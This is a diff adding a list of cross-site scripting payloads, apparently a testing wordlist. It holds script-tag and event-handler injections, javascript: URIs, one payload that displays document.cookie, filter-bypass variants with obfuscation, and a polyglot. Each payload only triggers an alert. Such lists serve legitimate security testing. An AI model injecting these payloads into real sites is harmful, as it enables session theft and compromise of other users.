@@ -1,1 +1,13 @@
-
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+"><script>alert('XSS')</script>
+'><svg/onload=alert(String.fromCharCode(88,83,83))>
+<iframe src="javascript:alert('XSS')">
+javascript:alert(document.cookie)
+<body onload=alert(1)>
+<a href="javascript:alert(1)">Click</a>
+<details/open/ontoggle=alert(1)>
+<scr<script>ipt>alert(1)</script>
+<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">
+jaVasCript:/*-/*`/*\`/*'/*"/**/(alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
